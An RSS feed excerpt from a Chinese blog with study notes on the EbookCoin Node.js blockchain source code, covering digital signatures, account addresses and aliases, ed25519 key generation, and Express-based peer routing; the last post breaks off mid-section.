      <link>https://www.diglp.xyz/2018/05/14/BC_EbookCoin_0x5/</link>
      <guid>https://www.diglp.xyz/2018/05/14/BC_EbookCoin_0x5/</guid>
      <pubDate>Sun, 13 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这次的一个period是基于《Nodejs区块链开发》这本书的的区块链项目–亿书，的源码学习笔记</p><blockquote><p>EbookCoin<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4uZ2l0" title="https://github.com/Ebookcoin/ebookcoin.git">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>现实中的签名是有法律效益的，每个人的签名痕迹都是独一无二的，所以签名是用来证明这个东西是否和你相关的最好的东西。在现在的数字时代，签名一样是必不可少的而且是是数字化的。…又啰嗦了好多。</p><p>所以在区块链上，的数字资产的证明，一样是离不开数字签名的，当然在拓展需求的情况下还存在着多重签名。</p><hr><p>数字签名技术，来自于 PKI 体系下的东西。我把某一数据的摘要值，使用我的私钥进行加密，接收方拥有我的公钥，即可以进行验证，对其加密摘要进行解密，之后与原文的同类型摘要进行对比，对比一致，就可以证明，数据没有被修改，且数据源是正确的发送方。这样就像等于对数据进行了签名。其具体的实现，在网上找了链接。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FtaWNrZWNzL2FydGljbGUvZGV0YWlscy83MzY5Njk1NA==" title="https://blog.csdn.net/qmickecs/article/details/73696954">数字签名原理及其应用-CSDN<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzUyNDkzNjk3" title="https://www.zhihu.com/question/52493697">数字签名、数字证书关系-知乎<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>前面我们讲了，在区块链的世界，一切的操作或多或少都离不开交易，那么如果我要转账操作，那么如何说明这个操作是合法的呢？这里就是数字签名在区块链里的作用，<strong>进行交易广播的签名</strong>， 这样大家都知道和认为，这个交易是合法的。</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>实现签名操作的模块如下</p><ul><li>./modules/signatures.js</li><li>./modules/multisignatures.js</li></ul><p>signatures.js 实现了对交易进行签名的功能</p><p>multisignatures.js 如其名曰，实现了消息的多重签名的功能。</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ul><li><p>API</p><p>  实现外部功能，就少不了API接口，一样的是对EXPRESS框架的拓展    </p><pre><code>router.map(shared, {    &quot;get /fee&quot;: &quot;getFee&quot;,    &quot;put /&quot;: &quot;addSignature&quot;});library.network.app.use(&apos;/api/signatures&apos;, router);</code></pre><p>  得到的路由接口的对应关系是</p><pre><code>get /api/signatures/fee    -&gt;    getFeeput /api/signatures/    -&gt;    addSignature</code></pre></li></ul><ul><li><p>添加签名</p><pre><code>签名的添加在文中实现的代码如下。不知为何这个功能在整个项目中是只是留出了接口，而且和原本想想的作用不是十分一致。shared.addSignature = function (req, cb) {    var body = req.body;    library.scheme.validate(body, {        type: &quot;object&quot;,            ... // 合法性检验        },        required: [&quot;secret&quot;, &quot;secondSecret&quot;]    }, function (err) {        if (err) {            return cb(err[0].message);        }            ... // 密码检测部分，签名出现多次        library.balancesSequence.add(function (cb) {            // 多重签名判断            if (body.multisigAccountPublicKey &amp;&amp; body.multisigAccountPublicKey != keypair.publicKey.toString(&apos;hex&apos;)) {                modules.accounts.getAccount({publicKey: body.multisigAccountPublicKey}, function (err, account) {                    ... // 合法性检验                    modules.accounts.getAccount({publicKey: keypair.publicKey}, function (err, requester) {                        if (err) {                            return cb(err.toString());                        }                        ... // 合法性检验                        var secondHash = crypto.createHash(&apos;sha256&apos;).update(body.secondSecret, &apos;utf8&apos;).digest();                        var secondKeypair = ed.MakeKeypair(secondHash);                        ... //                     });                });            } else {                modules.accounts.getAccount({publicKey: keypair.publicKey.toString(&apos;hex&apos;)}, function (err, account) {                    if (err) {                        return cb(err.toString());                    }                    ... // 合法性检验                    var secondHash = crypto.createHash(&apos;sha256&apos;).update(body.secondSecret, &apos;utf8&apos;).digest();                    var secondKeypair = ed.MakeKeypair(secondHash);                    try {                        var transaction = library.logic.transaction.create({                            type: TransactionTypes.SIGNATURE,                            sender: account,                            keypair: keypair,                            secondKeypair: secondKeypair                        });                    } catch (e) {                        return cb(e.toString());                    }                    modules.transactions.receiveTransactions([transaction], cb);                });            }        }, function (err, transaction) {            if (err) {                return cb(err.toString());            }            cb(null, {transaction: transaction[0]});        });    });}</code></pre><p>  代码的实现，实际上是创建了一个是签名类型的交易。感觉在此处的功能可能不是那么完整。这里又secondSecret，像是注册了第二密码。实际上在书中所描述的，是亿书的支付密码功能。</p></li></ul><ul><li><p>多重签名</p><p>  简单的理解来说，就好比一个文件需要几个人一起签名了之后才会生效，这个就是所谓的多重签名。就像是核弹的发射按钮一样，需要多个授权码才可以进行操作。</p><p>  完成应用的场景，我们可以设想成我们常见的担保交易。AB之间的交易，需要C进行担保，所以先A签名，B签名，确认之后C进行签名，使得交易有效，即可实现功能</p><p>  所以，多重签名的应用场景，在于 电子商务，财产分割，资金管理。</p><hr><pre><code>router.map(shared, {    &quot;get /pending&quot;: &quot;pending&quot;, // Get pending transactions    &quot;post /sign&quot;: &quot;sign&quot;, // Sign transaction    &quot;put /&quot;: &quot;addMultisignature&quot;, // Add multisignature    &quot;get /accounts&quot;: &quot;getAccounts&quot;});library.network.app.use(&apos;/api/multisignatures&apos;, router);</code></pre><p>  多重签名其对应着自己的一套独立的API。，一样的格式，实现组建功能的拓展</p><pre><code>required: [&apos;min&apos;, &apos;lifetime&apos;, &apos;keysgroup&apos;, &apos;secret&apos;]</code></pre><p>  这里是多重签名所需要的参数。</p></li></ul><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>实际上，这一部分的源码，感觉也只是从概念上再次理解了签名的实现。不过，这里的源码实现的方式可能和心中想的不太一样，</p><p>个人认为，签名是一个交易所必须的部分，因为这样才能证明交易的发起者，是正确的账户所有者。在文章所示的代码中，只是进行账户认证后，生成了secondKeypair。并没有实际上的使用其 prikey 对数据进行加密的部分 weird。可能具体细节是在交易里面实现的。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/14/BC_EbookCoin_0x5/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EbookCoin 源码 0x4</title>
      <link>https://www.diglp.xyz/2018/05/13/BC_EbookCoin_0x4/</link>
      <guid>https://www.diglp.xyz/2018/05/13/BC_EbookCoin_0x4/</guid>
      <pubDate>Sat, 12 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这次的一个period是基于《Nodejs区块链开发》这本书的的区块链项目–亿书，的源码学习笔记</p><blockquote><p>EbookCoin<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4uZ2l0" title="https://github.com/Ebookcoin/ebookcoin.git">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><p>最近的拖延症严重到极致，我都是有点佩服自己了，应该一周前的是现在还没有解决。</p><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><p>前：前面的部分，从篇幅都可以看出是个极简单的功能，一句话概括就是通过一个初始密码，生成一个密钥对，然后保存在account结构中。当然，我们的一个账户，将会实现一个 全面的api，用来显示账户的信息，像是余额，地址，私钥。。。</p><hr><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ul><li>./modules/accounts.js</li><li>./logic/account.js</li><li>./modules/contracts.js</li></ul><p>accounts.js 实现了账户功能</p><p>account.js 实现了账户属性</p><p>contracts.js 实现了联系人的功能</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ul><li><p>API</p><p>  已知，ebook是基于HTTP实现的区块链项目，所以，其功能是由其api实现的。所以这里从其实现的功能入手。这个称之为中间件，拓展路由的。</p></li></ul><pre><code>        router.map(shared, {            &quot;post /open&quot;: &quot;open&quot;,            &quot;get /getBalance&quot;: &quot;getBalance&quot;,            &quot;get /getPublicKey&quot;: &quot;getPublickey&quot;,            &quot;post /generatePublicKey&quot;: &quot;generatePublickey&quot;,            &quot;get /delegates&quot;: &quot;getDelegates&quot;,            &quot;get /delegates/fee&quot;: &quot;getDelegatesFee&quot;,            &quot;put /delegates&quot;: &quot;addDelegates&quot;,            &quot;get /username/get&quot;: &quot;getUsername&quot;,            &quot;get /username/fee&quot;: &quot;getUsernameFee&quot;,            &quot;put /username&quot;: &quot;addUsername&quot;,            &quot;get /&quot;: &quot;getAccount&quot;        });通过些拓展的API我们可以发现，一个账户的具体要实现的功能.打开账户,余额,公钥,等等.在后面的代码里,实现了中间件功能的添加,可以实现了在EXPRESS的 框架里的功能拓展.        library.network.app.use(&apos;/api/accounts&apos;, router);如果在http的请求层次,我们和得到如以下的映射        get /api/getBalance -&gt; shared.getBalance        post /api/open -&gt; shared.open</code></pre><ul><li><p>账户地址</p><p>  在比特币系统中地址实际上有多种, 1 开头的 账户地址,以及 3 开头的测试地址.所以根据地址的形式可以实现不同种类的地址分类.地址的生成过程在前面的地方有涉及,这里再贴出代码.</p><pre><code>Accounts.prototype.generateAddressByPublicKey = function (publicKey) {    var publicKeyHash = crypto.createHash(&apos;sha256&apos;).update(publicKey, &apos;hex&apos;).digest();    var temp = new Buffer(8);    for (var i = 0; i &lt; 8; i++) {        temp[i] = publicKeyHash[7 - i];    }    var address = bignum.fromBuffer(temp).toString() + &apos;L&apos;;    // 注意这里是在后面添加了L    if (!address) {        throw Error(&quot;wrong publicKey &quot; + publicKey);    }    return address;};</code></pre></li></ul><pre><code>在亿书的项目里面,使用了地址后面的后缀对不同的地址进行区分.上面的 **L** 是用于生成常规地址的.还有一类的地址,是块地址(这个好像在传统体系里面没有).其使用的是结尾的**C作为标识**    privated.getAddressByPublicKey = function (publicKey) {        var publicKeyHash = crypto.createHash(&apos;sha256&apos;).update(publicKey, &apos;hex&apos;).digest();        var temp = new Buffer(8);        for (var i = 0; i &lt; 8; i++) {            temp[i] = publicKeyHash[7 - i];        }        var address = bignum.fromBuffer(temp).toString() + &quot;C&quot;;        return address;    }    generatorId: privated.getAddressByPublicKey(raw.b_generatorPublicKey),</code></pre><ul><li><p>别名地址</p><p>  在亿书的项目中很好的加入了别名地址这个东西.比如我们在BTC体系下的转账需要输入很长的账户地址,往往,这个地址是十分难以记忆的,座椅在亿书的体系中引入了别名系统(ALIAS),就像支付宝的用户名一样,我们不需要一大堆冗长的字符串,只需要用户名一样的东西,就可以进行转账.具体的实现原理是在数据库中同时保存地址和别名.</p><p>  由于别名通常是用于转账的时候,所以别名的引用代码,在trsnaction的模块里</p><pre><code>shared.addTransactions = function (req, cb) {    var body = req.body;    library.scheme.validate(body, {        type: &quot;object&quot;,        properties: {            secret: {                ... // 用于检验合法性            }        },        required: [&quot;secret&quot;, &quot;amount&quot;, &quot;recipientId&quot;]    }, function (err) {        if (err) {            return cb(err[0].message);        }        // 这里是对密码的检验        var hash = crypto.createHash(&apos;sha256&apos;).update(body.secret, &apos;utf8&apos;).digest();            var keypair = ed.MakeKeypair(hash);        if (body.publicKey) {            if (keypair.publicKey.toString(&apos;hex&apos;) != body.publicKey) {                return cb(&quot;Invalid passphrase&quot;);            }        }        var query = {};        // 神奇的正则表达式        var isAddress = /^[0-9]+[L|l]$/g;        // 这里里的IF 就是显得很重要的了,实际上这里是对其进行的一次判断,        // 如果是合法的地址,那么就是使用地址查询, 如果不是地址就是使用别名查询        if (isAddress.test(body.recipientId)) {            query.address = body.recipientId;        } else {            query.username = body.recipientId;        }        library.balancesSequence.add(function (cb) {            modules.accounts.getAccount(query, function (err, recipient) {                ... // 合法性判断                var recipientId = recipient ? recipient.address : body.recipientId;                var recipientUsername = recipient ? recipient.username : null;                    ... // 一系列的正则判断                            try {                                // 创建交易结构                                var transaction = library.logic.transaction.create({                                    type: TransactionTypes.SEND,                                    amount: body.amount,                                    sender: account,                                    recipientId: recipientId,                                    recipientUsername: recipientUsername,                                    keypair: keypair,                                    requester: keypair,                                    secondKeypair: secondKeypair                                });                            } catch (e) {                                return cb(e.toString());</code></pre></li></ul><pre><code>具体部分注释中标出. 这里的 recipientID 可以是地址,也可以是用户名.</code></pre><hr><ul><li><p>别名注册</p><p>  别名在地址生成的本身是不需要的,需要的只是 secret ,所以,别名的注册是另一个功能. </p><pre><code>shared.addUsername = function (req, cb) {    var body = req.body;    library.scheme.validate(body, {        ... // 格式检测            }        },        required: [&apos;secret&apos;, &apos;username&apos;]    }, function (err) {        if (err) {            return cb(err[0].message);        }        var hash = crypto.createHash(&apos;sha256&apos;).update(body.secret, &apos;utf8&apos;).digest();        var keypair = ed.MakeKeypair(hash);        // 打开钱包的密码判断        if (body.publicKey) {            if (keypair.publicKey.toString(&apos;hex&apos;) != body.publicKey) {                return cb(&quot;Invalid passphrase&quot;);            }        }        library.balancesSequence.add(function (cb) {            // 判断是否多重签名                    if (body.multisigAccountPublicKey &amp;&amp; body.multisigAccountPublicKey != keypair.publicKey.toString(&apos;hex&apos;)) {                    modules.accounts.getAccount({publicKey: keypair.publicKey}, function (err, requester) {                        ... // 合法性                         var secondKeypair = null;                        if (requester.secondSignature) {                            var secondHash = crypto.createHash(&apos;sha256&apos;).update(body.secondSecret, &apos;utf8&apos;).digest();                            secondKeypair = ed.MakeKeypair(secondHash);                        }                        try {                            var transaction = library.logic.transaction.create({                                type: TransactionTypes.USERNAME,                                username: body.username,                                sender: account,                                keypair: keypair,                                secondKeypair: secondKeypair,                                requester: keypair                            });                        } catch (e) {                            return cb(e.toString());                        }                        modules.transactions.receiveTransactions([transaction], cb);                    });                });            } else {                self.getAccount({publicKey: keypair.publicKey.toString(&apos;hex&apos;)}, function (err, account) {                    if (err) {                    ... // 合法性检测                    var secondKeypair = null;                    if (account.secondSignature) {                        var secondHash = crypto.createHash(&apos;sha256&apos;).update(body.secondSecret, &apos;utf8&apos;).digest();                        secondKeypair = ed.MakeKeypair(secondHash);                    }                    try {                        var transaction = library.logic.transaction.create({                            type: TransactionTypes.USERNAME,                            username: body.username,                            sender: account,                            keypair: keypair,                            secondKeypair: secondKeypair                        });                    } catch (e) {                        return cb(e.toString());                    }                    ... //</code></pre></li></ul><pre><code>在这部分的代码中,实际上的主要函数,是在上面创建的一个交易,这个交易是写在链上的,`type: TransactionTypes.USERNAME,`,这样就可以建立一个别名,实现地址的映射.</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看完这部份的功能, 其实发现了一个共性我们可以很简单的概述我们上面所有的 操作的功能.就是 <strong>交易</strong> ,<strong>没错一切就是交易.</strong></p><p>这里的交易实际上是一种泛化,其实是指的在区块链上所有的记录,也就是上链.一旦数据上链,那么就是产生一个不可改变的记录值.</p><p>这里 的api 实际上是对特殊交易种类的不同封装.</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/13/BC_EbookCoin_0x4/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EbookCoin 源码 0x3</title>
      <link>https://www.diglp.xyz/2018/05/12/BC_EbookCoin_0x3/</link>
      <guid>https://www.diglp.xyz/2018/05/12/BC_EbookCoin_0x3/</guid>
      <pubDate>Fri, 11 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这次的一个period是基于《Nodejs区块链开发》这本书的的区块链项目–亿书，的源码学习笔记</p><blockquote><p>EbookCoin<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4uZ2l0" title="https://github.com/Ebookcoin/ebookcoin.git">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="加密和验证"><a href="#加密和验证" class="headerlink" title="加密和验证"></a>加密和验证</h2><p>其实慢慢的发现，如果把区块链给拆解了，那么一个P2P网络的上一层，就是一个 <strong>PKI(Public Key Infrastructure)</strong> ，一个完整的加密体系。使得加密网络的实现。</p><h3 id="模块包含"><a href="#模块包含" class="headerlink" title="模块包含"></a>模块包含</h3><ul><li>./modules/accounts.js</li><li>./logic/account.js</li></ul><p>accounts.js 实现了账户功能</p><p>account.js 实现了账户属性</p><h3 id="技术概念"><a href="#技术概念" class="headerlink" title="技术概念"></a>技术概念</h3><p>在书中讲解的主要是公钥加密，此处略去。</p><p>在比特币的环境下，一个密钥对的公钥可以近似的看作这个账户的地址。私钥是用于生成比特币支付的必须的签名，用来证明对该账户的所有权，即地址中的所有的资金对视取决于其对应的密钥进行的所有权和控制权。</p><p><strong>私钥必须严格保密</strong>，一旦发生丢失，其保护的比特币永远不会找回。</p><p>在ebookcoin的项目里，也是直接使用了公钥地址作为了用户的ID。</p><p>加密过程，使用了NodeJs的<strong>Crypto</strong>的模块，提供了安全凭证的方式，用于HTTPS/HTTP的连接，有对OoenSSL，HMAC，Hash，加密，解密，签名，验证，都是是进行了封装。</p><p>在项目中实现的hash算法是 HASH256.</p><pre><code>var hash = crypto.createHash(&apos;sha256&apos;).update(data).digest();</code></pre><p>上面的语句实际上是实现了一个，先创建 256 的实例，之后对数据进行处理，最后使用digest，获得加密字符串(密文)。之后可以使用Ed25518实现密钥对</p><p><strong>签名验证</strong> 使用Ed25519组件，封装了数字签名算法，签名验证速度很快。7100 Signature/s</p><pre><code>var res = ed.Verify(hash, signatureBuffer || &apos; &apos;, publicKeyBuffer || &apos; &apos;);</code></pre><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>使用过钱包都知道，很多软件，在创建钱包的实话，只是需要使用一次输入的密码就好了，另外可能会加上混淆。实际上，就是这个密码，会生成我们的公钥和私钥。（一般我们注册的时候是不是用户名密码都有来着？？）</p><p>在这个项目中，其公钥生成代码如下</p><pre><code>shared.generatePublickey = function (req, cb) {    var body = req.body;    library.scheme.validate(body, {            // 检查结构合法，多次出现        type: &quot;object&quot;,        properties: {            secret: {                type: &quot;string&quot;,                minLength: 1            }        },        required: [&quot;secret&quot;]    }, function (err) {        if (err) {            return cb(err[0].message);        }        privated.openAccount(body.secret, function (err, account) {        // 通过合法性检测，就开户            var publicKey = null;            if (!err &amp;&amp; account) {                publicKey = account.publicKey;            }            cb(err, {                publicKey: publicKey            });        });    });};</code></pre><p>上面的代码如何产生一个地址公钥的过程，前面的部分检测合法性，后面的就是使用就对用户的secret进行处理。后面调用 <code>openAccount</code></p><pre><code>privated.openAccount = function (secret, cb) {    var hash = crypto.createHash(&apos;sha256&apos;).update(secret, &apos;utf8&apos;).digest();    var keypair = ed.MakeKeypair(hash);    self.setAccountAndGet({publicKey: keypair.publicKey.toString(&apos;hex&apos;)}, cb);    // 以键值的形式传入了参数};</code></pre><p>调用的时候，把 secret 参数传入。在这里对密码进行 <strong>sha256</strong> 处理，和前面描述一样，先建立实例，之后使用进行散列。</p><p>这里得到 hash 之后，使用 <code>MakeKeypair</code> 进行生成密钥对.</p><pre><code>var    ed = require(&apos;ed25519&apos;);</code></pre><p>这里的 <code>MakeKeypair</code> 是ed25519自带的模块,不展开了.其返回的值实际上是一个 密钥对.而后使用内部成员.<code>setAccountAndGet</code></p><pre><code>Accounts.prototype.setAccountAndGet = function (data, cb) {    var address = data.address || null;    if (address === null) {        if (data.publicKey) {            address = self.generateAddressByPublicKey(data.publicKey);        } else {            return cb(&quot;Missing address or public key&quot;);        }    }    if (!address) {        throw cb(&quot;Invalid public key&quot;);    }    library.logic.account.set(address, data, function (err) {        if (err) {            return cb(err);        }        library.logic.account.get({address: address}, cb);    });};</code></pre><p>这里的一句 <code>var address = data.address || null;</code>显得很神奇.在网上看到了如下解释</p><hr><blockquote><ul><li>js 这种写法是什么意思 var a= b || c</li></ul><p>在js中，这相当于一个赋值语句，如果b的值大于0或为true，那么就把b的值赋给a，否在就把c的值赋给a</p></blockquote><hr><p>所以,这里就是判断,这个data的address是否是空,不空,就赋值addr,空就幅值 null.</p><p>如果是空,那我们就直接进入if,给其分配addr.我们知道,<strong>地址是其公钥通过特定算法得到的</strong></p><pre><code>Accounts.prototype.generateAddressByPublicKey = function (publicKey) {    var publicKeyHash = crypto.createHash(&apos;sha256&apos;).update(publicKey, &apos;hex&apos;).digest();    var temp = new Buffer(8);    for (var i = 0; i &lt; 8; i++) {        temp[i] = publicKeyHash[7 - i];    }    var address = bignum.fromBuffer(temp).toString() + &apos;L&apos;;    if (!address) {        throw Error(&quot;wrong publicKey &quot; + publicKey);    }    return address;};</code></pre><p>使用这段函数,我们从函数名可以看出,是通过 pubkey得到我们拥有的地址。从函数得知，<strong>其地址，是取其hash的前8位倒序。</strong></p><p>返回上级函数，一次判断生成地址是否为空。之后调用logic。保存账户地址参数。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>这里的代码篇幅很大，本书中只是讲解了部分简单的功能，这里做个推广的总结，我们的地址是来自于公钥的特殊处理。在一系列操作之后，地址，公钥，私钥，都会存入我们的 logic的参数里面，实现了一个钱包的创建</p><p>最近，拖延症又是严重的时候。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/12/BC_EbookCoin_0x3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EbookCoin 源码 0x2</title>
      <link>https://www.diglp.xyz/2018/05/03/BC_EbookCoin_0x2/</link>
      <guid>https://www.diglp.xyz/2018/05/03/BC_EbookCoin_0x2/</guid>
      <pubDate>Wed, 02 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这次的一个period是基于《Nodejs区块链开发》这本书的的区块链项目–亿书，的源码学习笔记</p><blockquote><p>EbookCoin<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4uZ2l0" title="https://github.com/Ebookcoin/ebookcoin.git">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="P2P网络"><a href="#P2P网络" class="headerlink" title="P2P网络"></a>P2P网络</h2><p>在书中的标题是一个精巧的P2P网络的实现.</p><h3 id="模块包含"><a href="#模块包含" class="headerlink" title="模块包含"></a>模块包含</h3><p>这部分主要的包含文件包括</p><ul><li>./modules/peer.js         // 用于实现作为节点的功能</li><li>./modules/transport.js    // 实现传输？</li><li>./helper/router.js        // 如其名，路由</li></ul><p>transport 和 router 作为 <strong>peer</strong> 的两个辅助模块，一起实现了一个p2p网络上的独立节点。</p><h3 id="router-js-路由拓展"><a href="#router-js-路由拓展" class="headerlink" title="router.js 路由拓展"></a>router.js 路由拓展</h3><p>这个文件内容不多，<strong>42 line</strong></p><ul><li><p><strong>27</strong> 路由定义 </p><pre><code>var Router = function () {    var router = require(&apos;express&apos;).Router();    router.use(function (req, res, next) {        res.header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);        res.header(&quot;Access-Control-Allow-Headers&quot;, &quot;Origin, X-Requested-With, Content-Type, Accept&quot;);        next();    });    router.map = map;    return router;}</code></pre><p>  这段代码，实现了一个 Router 的辅助模块。定义 router 是一个 基于Express 的拓展。实现两个功能：</p><ul><li><code>&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;</code> <code>&quot;Access-Control-Allow-Headers&quot;, &quot;Origin, X-Requested-With,     Content-Type, Accept&quot;</code>说明允许跨域请求，任何的ip和端口的节点都可以被访问。 </li><li><code>router.map</code> 设置(指定)了地址的映射方法。</li></ul></li></ul><pre><code>&gt; [什么是跨域请求](https://blog.csdn.net/github_37360787/article/details/54834789)    </code></pre><ul><li><p><strong>3</strong> 地址映射</p><p>  这里的map有两个参数，root，config。</p><pre><code>function map(root, config) {</code></pre><ul><li>root：定义开放API的逻辑函数</li><li><p>config：定义了路由和root所定义的函数之间的对应关系。</p><p>等同于<br>  router.get(‘/peers’, function(req,res,next){</p><pre><code>root.getPeers(...);</code></pre><p>  });</p><p><strong>在Js中对象是散列的，所以<code>root.getPeer()</code> 和 root[‘getPeer’]相同</strong></p><p>  router<a href="route[1], function (req, res, next">route[0]</a> {</p><p>像是这里，实际上分割参数后，第一个就是目标(/peer)，第二个就是方法。</p><p>在 peer.js 的文件中，可以看到对map函数的调用<br>  router.map(shared, {</p><pre><code>&quot;get /&quot;: &quot;getPeers&quot;,&quot;get /version&quot;: &quot;version&quot;,&quot;get /get&quot;: &quot;getPeer&quot;</code></pre><p>  });</p><p>通过阅读源码我们可以知道，router 是对 <strong>get /version</strong>的分割。所以route[0] 是 <strong>get</strong>，route[1] 就是我们的请求的url。</p><p>那么这样的话我们可以把上面的代码进行转换</p><p>  router<a href="&#39;/&#39;, function (req, res, next">get</a> {</p><p><code>router.get</code> 又是什么？ 这样我们转到前面的路由定义</p><p>  var router = require(‘express’).Router();</p><p>所以说是 <strong>express框架</strong> 所提供的路由对象的方法。那么到网上检索之</p><blockquote><p><span class="exturl" data-url="aHR0cDovL3d3dy5leHByZXNzanMuY29tLmNuL2d1aWRlL3JvdXRpbmcuaHRtbA==" title="http://www.expressjs.com.cn/guide/routing.html">ExpressRouter<i class="fa fa-external-link"></i></span><br>用官方的话讲:对象的一个实例， METHOD 是一个 HTTP 请求方法， path 是服务器上的路径， callback 是当路由匹配时要执行的函数</p></blockquote><p>所以说，这里的代码，实际上是实现了路由地址和内容的绑定</p></li></ul></li></ul><hr><pre><code>这里有个point     var router = this;这里的函数式编程就厉害了，凭空的一个 this ，实际上了解了之后，知道，这个this 就是指的**调用当前函数的对象**。        var router = new Router();        router.map(shared, {            &quot;get /&quot;: &quot;getPeers&quot;,            &quot;get /version&quot;: &quot;version&quot;,            &quot;get /get&quot;: &quot;getPeer&quot;        });</code></pre><h3 id="peer-js-节点"><a href="#peer-js-节点" class="headerlink" title="peer.js 节点"></a>peer.js 节点</h3><h4 id="节点路由"><a href="#节点路由" class="headerlink" title="节点路由"></a>节点路由</h4><ul><li><p><strong>16</strong> 构造器 </p><p>  这里是JS中 Peer 的构造器。</p><pre><code>// Constructorfunction Peer(cb, scope) {    library = scope;                // 这里的scope 就是从app.js 传来的    self = this;    self.__private = privated;    privated.attachApi();    setImmediate(cb, null, self);    // 定时执行}</code></pre></li></ul><hr><ul><li><p><strong>25</strong> 功能绑定    </p><p>  可以使用这样的方法实现保护函数。这个函数的功能从字面意义上就是绑定API。实际上就是使得我们的 http 请求对应的API，绑定到具体的返回操作。</p><pre><code>// private methodsprivated.attachApi = function () {    var router = new Router();    // 作为中间件    // 没有挂载路径的中间件，应用的每个请求都会执行该中间件    // 所以这段代码可以理解为，模块是否加载，如果没有，就返回错误    router.use(function (req, res, next) {        if (modules) return next();        res.status(500).send({success: false, error: &quot;Blockchain is loading&quot;});    });</code></pre></li></ul><pre><code>        // 绑定关系        router.map(shared, {            &quot;get /&quot;: &quot;getPeers&quot;,            &quot;get /version&quot;: &quot;version&quot;,            &quot;get /get&quot;: &quot;getPeer&quot;        });        // 怎么绕开了这个报错的中间件？        router.use(function (req, res) {            res.status(500).send({success: false, error: &quot;API endpoint not found&quot;});        });这里的 **express.use** 是作为中间件，这个前面就应该看看。&gt;中间件（Middleware） 是一个函数，它可以访问请求对象（request object (req)）, 响应对象（response object (res)）, 和 web 应用中处于请求-响应循环流程中的中间件，一般被命名为 next 的变量。这里还有很重要的一点:**如果当前中间件没有终结请求-响应循环，则必须调用 next() 方法将控制权交给下一个中间件，否则请求就会挂起。**&gt; [Express_中间件](http://www.expressjs.com.cn/guide/using-middleware.html)</code></pre><hr><ul><li><p><strong>44</strong> 拓展Express</p><pre><code>    library.network.app.use(&apos;/api/peers&apos;, router);    library.network.app.use(function (err, req, res, next) {            if (!err) return next();            library.logger.error(req.url, err.toString());            res.status(500).send({success: false, error: err.toString()});    });};</code></pre><p>  这一部分，一样的是以 use打头，前面是路径，后面是 Obj。所以这里是对上面的我们定义的 <code>var router = require(&#39;express&#39;).Router()</code> 的一个拓展。这样，以下请求，将会使用 <strong>router这部分的功能</strong>。</p><ul><li><span class="exturl" data-url="aHR0cDovL2lwOnBvcnQvYXBpL3BlZXJzLw==" title="http://ip:port/api/peers/">http://ip:port/api/peers/<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2lwOnBvcnQvYXBpL3BlZXJzL3ZlcnNpb24v" title="http://ip:port/api/peers/version/">http://ip:port/api/peers/version/<i class="fa fa-external-link"></i></span></li><li><p><span class="exturl" data-url="aHR0cDovL2lwOnBvcnQvYXBpL3BlZXJzL2dldC8=" title="http://ip:port/api/peers/get/">http://ip:port/api/peers/get/<i class="fa fa-external-link"></i></span></p><p>后继的中间件，就是对错误情况进行处理了</p></li></ul></li></ul><hr><ul><li><p><strong>455</strong> 合法性检测<br>  这个是 z_scheme 